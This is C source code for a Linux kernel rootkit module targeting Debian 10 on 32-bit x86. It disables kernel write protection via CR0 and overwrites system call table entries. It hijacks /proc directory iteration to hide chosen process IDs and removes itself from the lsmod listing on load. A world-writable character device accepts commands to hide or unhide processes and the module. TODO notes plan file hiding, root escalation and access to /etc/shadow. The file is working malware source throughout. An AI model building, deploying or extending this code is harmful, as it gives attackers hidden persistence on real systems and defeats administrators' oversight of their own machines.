/**
 * Targets Debian 10, x86-32bit
 * Kernel 4.19.0
 *
 * TODO:
 * hide/show files
 * setuid 0 (kill command/signals ?)
 * /etc/passwd & /etc/shadow
 **/

/**
 * As root...
 * 1. add `nokaslr` to /etc/default/grub in GRUB_CMDLINE_LINUX_DEFAULT
 * 2. execute `update-grub`
 * 3. `grep sys_call_table /boot/System.map-$(uname -r)` to
 *    find the address of the system call table and change the value below
 **/
static unsigned long *sct = 0xc167b180;

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/namei.h>        // for kern_path
#include <linux/slab.h>         // kmalloc
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/device.h>       // device creation
#include <linux/cdev.h>         // character device
#include <linux/types.h>
#include <linux/fs.h>           // filesystem
#include <linux/proc_fs.h>      // for proc vfs
#include <linux/string.h>       // string manipulation
#include <linux/dirent.h>       // directory entries
#include <linux/list.h>         // linked lists

#include "eunuchs.h"

MODULE_AUTHOR("meow?");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("yeth plz");
MODULE_VERSION("1.0");
MODULE_ALIAS("kthxbye");

/**
 * We use the kernel's linked list implementation to track which pids to hide.
 **/
typedef struct eunuchs_proc_hide_by_pid
{
    struct list_head list;
    char *pid;
} eunuchs_proc_hide_by_pid;

LIST_HEAD(proc_hide_by_pid_list);

////////////////////////////////////////////////////////////////////////////////
// CHAR DEVICE

static struct class *eunuchs_cl;    // for class descriptor
static int eunuchs_dev_maj_number;  // major number for device

static int eunuchs_char_open(struct inode *i, struct file *f)
{
    /* [> printk("device open()\n"); <] */
    return 0;
}

static int eunuchs_char_release(struct inode *i, struct file *f)
{
    /* [> printk("device release()\n"); <] */
    return 0;
}

static ssize_t eunuchs_char_read(struct file *f, char __user *buf, size_t len, loff_t *off)
{
    /* [> printk("device read()\n"); <] */
    debug("read() got [%s] [%d bytes]\n", buf, len);
    return 0;
}

/**
 * eunuchs_char_write(struct file*, char *, size_t, loff_t *) -
 *
 * This is our handler for writing to /dev/euchar. This can be written to by
 * `echo 'a' > /dev/euchar` as root.
 *
 *
 * Commands:
 *  ohaiplzshowallhiding            - shows all hidden pids (DEBUG ONLY)
 *  kthxbye                         - hide the LKM from lsmod (NOTE: You can't
 *                                    remove the LKM until after you make it visible)
 *  lemmesee                        - show the LKM in lsmod
 *  ohaiplzhideproc [pid_to_hide]   - hides specified process by pid
 *  ohaiplzshowproc [pid_to_show]   - shows specified process by pid
 *
 *
 * TODO: implement further interaction options for this to be able to control the lkm.
 **/
static ssize_t eunuchs_char_write(struct file *f, const char __user *buf, size_t len, loff_t *off)
{
    char a[len+1];
    size_t i;

    /* only care about things up to newline (or null term) */
    for(i = 0; i < len; i++)
    {
        if(buf[i] != '\n')
            a[i] = buf[i];
        else
            break;
    }
    a[i] = '\0';

    debug("write() got [%s] [%d bytes]\n", a, len);

    if(strncmp(a, "kthxbye", 7) == 0)
    {
        eunuchs_hide_lkm();
    }
    else if(strncmp(a, "lemmesee", 8) == 0)
    {
        eunuchs_show_lkm();
    }
    else if(strncmp(a, "ohaiplzhideproc ", 16) == 0)
    {
        char *p = a + 16;
        debug("hiding pid %s\n", p);
        hide_proc_by_pid(p);
    }
    else if(strncmp(a, "ohaiplzshowproc ", 15) == 0)
    {
        char *p = a + 16;
        debug("showing pid %s\n", p);
        show_proc_by_pid(p);
    }
    else if(strncmp(a, "ohaiplzhidefile ", 15) == 0)
    {
        debug("want to hide file\n");
    }
#ifdef DEBUG
    else if(strncmp(a, "ohaiplzshowallhiding", 20) == 0)
    {
        eunuchs_lists_show_all();
    }
#endif
    return len;
}

static struct file_operations eunuchs_fops =
{
    .owner = THIS_MODULE,
    .read = eunuchs_char_read,
    .write = eunuchs_char_write,
    .open = eunuchs_char_open,
    .release = eunuchs_char_release
};

/**
 * eunuchs_devnode(struct device*, umode_t*) -
 *  Changes the permissions on the char device to be 0666
 **/
static char* eunuchs_devnode(struct device *dev, umode_t *mode)
{
    if(mode)
        *mode = 0666;
    return NULL;
}

/**
 * eunuchs_dev_init() -
 *  Creates a char device so that we can communicate with the lkm from userland
 **/
static int eunuchs_dev_init()
{
    if((eunuchs_dev_maj_number = register_chrdev(0, EUNUCHS_DEVICE_NAME, &eunuchs_fops)) < 0)
    {
        debug("register_chrdev() failed\n");
        return -1;
    }

    if((eunuchs_cl = class_create(THIS_MODULE, EUNUCHS_CLASS_NAME)) == NULL)
    {
        debug("class_create() failed\n");
        unregister_chrdev(eunuchs_dev_maj_number, EUNUCHS_DEVICE_NAME);
        return -1;
    }
    eunuchs_cl->devnode = eunuchs_devnode;

    if(device_create(eunuchs_cl, NULL, MKDEV(eunuchs_dev_maj_number, 0), NULL, EUNUCHS_DEVICE_NAME) == NULL)
    {
        debug("device_create() failed\n");
        class_destroy(eunuchs_cl);
        unregister_chrdev(eunuchs_dev_maj_number, EUNUCHS_DEVICE_NAME);
        return -1;
    }

    debug("device created\n");
    return 0;
}

/**
 * enuchs_dev_remove() -
 *  Removes the char device
 **/
static int eunuchs_dev_remove()
{
    device_destroy(eunuchs_cl, MKDEV(eunuchs_dev_maj_number, 0));
    class_destroy(eunuchs_cl);
    unregister_chrdev(eunuchs_dev_maj_number, EUNUCHS_DEVICE_NAME);
    debug("device removed\n");
    return 0;
}

////////////////////////////////////////////////////////////////////////////////
/* Pointers to save the original functions to. */
static typeof(sys_read) *orig_read;
static typeof(sys_getdents) *orig_getdents;
static typeof(sys_getdents64) *orig_getdents64;

/**
 * read() handler
 **/
static asmlinkage long eunuchs_read(int fd, char __user *buf, size_t count)
{
    /* printk("reading..\n"); */
    return orig_read(fd, buf, count);
}

/**
 * getdents() handler. Probably not needed. What calls this explicitly?
 **/
static asmlinkage int eunuchs_getdents(unsigned int fd, struct linux_dirent __user *fp, unsigned int count)
{
    /* debug("got getdents call\n"); */
    return orig_getdents(fd, fp, count);
}

/**
 * getdents64() handler. This is used for large filesystems, and seems to be
 * what ls uses.
 **/
static asmlinkage int eunuchs_getdents64(unsigned int fd, struct linux_dirent64 __user *fp, unsigned int count)
{
    /* debug("got getdents64 call\n"); */
    return orig_getdents64(fd, fp, count);
}

////////////////////////////////////////////////////////////////////////////////
/* This is the original value of CR0 */
static unsigned original_cr0;

/**
 * cr0_enable_write() -
 *  Twiddles CR0 to enable writing to read-only memory
 **/
static void cr0_enable_write()
{
    unsigned cr0 = 0;
    debug("disabling page write protection\n");
    asm volatile("movl %%cr0, %%eax"
                 :"=a"(cr0));
    original_cr0 = cr0;
    cr0 &= 0xfffeffff;
    asm volatile("movl %%eax, %%cr0"
                 :
                 :"a"(cr0));
}

/**
 * cr0_disable_write() -
 *  Twiddles CR0 to disable writing to read-only memory
 **/
static void cr0_disable_write()
{
    debug("restoring write protection on cr0\n");
    asm volatile("movl %%eax, %%cr0"
                 :
                 :"a"(original_cr0));
}

////////////////////////////////////////////////////////////////////////////////
// PROCESS HIDING
//
//   adapted from / inspired by
//   https://yassine.tioual.com/index.php/2017/01/10/hiding-processes-for-fun-and-profit/

/**
 * hide_proc_by_pid(char *) -
 *  Hides a specified pid.
 **/
static int hide_proc_by_pid(char *pid)
{
    eunuchs_proc_hide_by_pid *hide = kmalloc(sizeof(eunuchs_proc_hide_by_pid), GFP_KERNEL);
    if(hide == NULL)
        return -1;
    hide->pid = kmalloc(sizeof(char) * (strlen(pid) + 1), GFP_KERNEL);
    strncpy(hide->pid, pid, strlen(pid) + 1);

    list_add(&hide->list, &proc_hide_by_pid_list);
    return 0;
}

/**
 * show_proc_by_pid(char *) -
 *  Shows a specified pid.
 **/
static int show_proc_by_pid(char *pid)
{
    eunuchs_proc_hide_by_pid *show = NULL, *tmp = NULL;
    list_for_each_entry_safe(show, tmp, &proc_hide_by_pid_list, list)
    {
        if(strcmp(show->pid,pid) == 0)
        {
            list_del(&(show->list));
            kfree(show->pid);
            kfree(show);
        }
    }
    return 0;
}

static struct file_operations proc_fileops;
static struct file_operations *backup_proc_fileops;
static struct inode *proc_inode;
static struct path p;
static struct dir_context *backup_ctx;

/**
 * eunuchs_proc_filldir(struct dir_context *, const char *, int, loff_t,
 *                      uint64_t, unsigned int) -
 *  This evaluates whether or not we should strip out the current entry from the
 *  list returned to the user. If the pid of (proc_name) exists in our
 *  proc_hide_by_pid_list, we return 0. Otherwise, we allow the original
 *  function to do its thing.
 **/
static int eunuchs_proc_filldir(struct dir_context *d_ctx, const char *proc_name, int len, loff_t off, uint64_t inode, unsigned int d_type)
{
    /* does the process name exist in the list of things we should be hiding? */
    eunuchs_proc_hide_by_pid *p = NULL;
    list_for_each_entry(p, &proc_hide_by_pid_list, list)
    {
        if(strcmp(proc_name, p->pid) == 0)
        {
            debug("filtering %s out of results\n", proc_name);
            return 0;
        }
    }

    return backup_ctx->actor(backup_ctx, proc_name, len, off, inode, d_type);
}

/* a dir_context that contains our filldir function */
static struct dir_context eunuchs_proc_ctx =
{
    .actor = eunuchs_proc_filldir,
};

/**
 * eunuchs_proc_iterate_shared(struct file *, struct dir_context *) -
 *  This iterates over each entry in the directory, calling our filldir function
 **/
static int eunuchs_proc_iterate_shared(struct file *file, struct dir_context *ctx)
{
    int res = 0;
    eunuchs_proc_ctx.pos = ctx->pos;
    backup_ctx = ctx;
    res = backup_proc_fileops->iterate_shared(file, &eunuchs_proc_ctx);
    ctx->pos = eunuchs_proc_ctx.pos;

    return res;
}

/**
 * process_hide_init() -
 *  Gets the /proc inode, backs up the original values for its file operations,
 *  and updates the file ops to use our versions instead (for iterating).
 **/
static int process_hide_init(void)
{
    debug("hijacking /proc vfs & file ops\n");

    if(kern_path("/proc", 0, &p))
        return -1;

    /* get the inode & make a backup of the fileops */
    proc_inode = p.dentry->d_inode;
    backup_proc_fileops = proc_inode->i_fop;

    /* modify the file ops to use our iterator instead */
    proc_fileops = *proc_inode->i_fop;
    proc_fileops.iterate_shared = eunuchs_proc_iterate_shared;
    proc_inode->i_fop = &proc_fileops;

    return 0;
}

/**
 * process_hide_remove() -
 *  Restores /proc to its original state.
 **/
static void process_hide_remove(void)
{
    debug("restoring /proc vfs & file ops\n");

    if(kern_path("/proc", 0, &p))
        return;

    // restore the proc vfs & file operations
    proc_inode = p.dentry->d_inode;
    proc_inode->i_fop = backup_proc_fileops;

}

////////////////////////////////////////////////////////////////////////////////
// LIST FUNCTIONS

#ifdef DEBUG
static int eunuchs_lists_show_all(void)
{
    eunuchs_proc_hide_by_pid *p = NULL;

    debug("Hide by pid list contains:\n");
    list_for_each_entry(p, &proc_hide_by_pid_list, list)
    {
        debug("[%s]\n", p->pid);
    }
}
#endif

/**
 * eunuchs_lists_init() -
 *  Initializes our linked lists which control hide/show of certain things.
 **/
static int eunuchs_lists_init(void)
{
    // add default username to hide processes by
    /*
     * eunuchs_proc_hide_by_user *hide_by_un_def = kmalloc(sizeof(eunuchs_proc_hide_by_user), GFP_KERNEL);
     * hide_by_un_def->username = kmalloc(sizeof(char) * 8, GFP_KERNEL);
     * if(hide_by_un_def == NULL)
     *     return -1;
     * if(hide_by_un_def->username == NULL)
     *     return -1;
     */

    debug("setting up lists\n");

    /*
     * strncpy(hide_by_un_def->username, "eunuchs", 8);
     * list_add(&hide_by_un_def->list, &proc_hide_by_user_list);
     */

    return 0;
}

/**
 * eunuchs_lists_free() -
 *  Frees all lists. Note that we have to use the _safe version of for_each, due
 *  to changing the structure of the list, to avoid null pointer exceptions.
 **/
static void eunuchs_lists_free(void)
{
    /* eunuchs_proc_hide_by_user *ud = NULL, *ud2 = NULL; */
    eunuchs_proc_hide_by_pid *pd = NULL, *pd2 = NULL;

    debug("freeing lists\n");

    /* free hide_by_user list */
    /*
     * list_for_each_entry_safe(ud, ud2, &proc_hide_by_user_list, list)
     * {
     *     debug("removing %s from username hiding list\n", ud->username);
     *     list_del(&ud->list);
     *     kfree(ud->username);
     *     kfree(ud);
     * }
     */

    /* free hide by pid list */
    list_for_each_entry_safe(pd, pd2, &proc_hide_by_pid_list, list)
    {
        debug("removing %s from pid hiding list\n", pd->pid);
        list_del(&pd->list);
        kfree(pd);
    }
}

////////////////////////////////////////////////////////////////////////////////
// MAIN DRIVERS

static struct list_head *mod_list = NULL;

/**
 * eunuchs_hide_lkm() -
 *  Hides the module from `lsmod`
 **/
static int eunuchs_hide_lkm(void)
{
    debug("Hiding LKM from lsmod\n");
    mod_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    return 0;
}

/**
 * eunuchs_show_lkm() -
 *  Allows the module to be visible in `lsmod`
 **/
static int eunuchs_show_lkm(void)
{
    debug("Showing LKM in lsmod\n");
    if(mod_list)
    {
        list_add(&THIS_MODULE->list, mod_list);
        mod_list = NULL;
    }
    return 0;
}

/**
 * eunuchs_hooks_install() -
 *  Installs our hooks, saving the old system call function pointers
 **/
static int eunuchs_hooks_install(void)
{
    debug("installing hooks\n");

    orig_read = (typeof(sys_read) *)sct[__NR_read];
    sct[__NR_read] = (void *)&eunuchs_read;

    orig_getdents = (typeof(sys_getdents) *)sct[__NR_getdents];
    sct[__NR_getdents] = (void *)&eunuchs_getdents;

    orig_getdents64 = (typeof(sys_getdents64) *)sct[__NR_getdents64];
    sct[__NR_getdents64] = (void *)&eunuchs_getdents64;

    return 0;
}

/**
 * eunuchs_hooks_remove() -
 *  Removes our hooks, restoring the original system call function pointers.
 **/
static void eunuchs_hooks_remove(void)
{
    debug("removing hooks\n");
    sct[__NR_read] = (void *)orig_read;
    sct[__NR_getdents] = (void *)orig_getdents;
    sct[__NR_getdents64] = (void *)orig_getdents64;
}

/**
 * Initializes the LKM.
 **/
static int eunuchs_init(void)
{
    debug("init\n");

    /* set up char device */
    if(eunuchs_dev_init() == -1)
        return -1;

    /* initialize our lists */
    if(eunuchs_lists_init() == -1)
        return -1;

    /* install hooks */
    cr0_enable_write();
    eunuchs_hooks_install();
    process_hide_init();
    cr0_disable_write();

    /* hide the module */
    eunuchs_hide_lkm();

    return 0;
}

/**
 * Unloads the LKM.
 **/
static void eunuchs_exit(void)
{
    debug("exit\n");

    eunuchs_show_lkm();

    cr0_enable_write();
    eunuchs_hooks_remove();
    process_hide_remove();
    cr0_disable_write();

    eunuchs_dev_remove();
    eunuchs_lists_free();
}

module_init(eunuchs_init);
module_exit(eunuchs_exit);
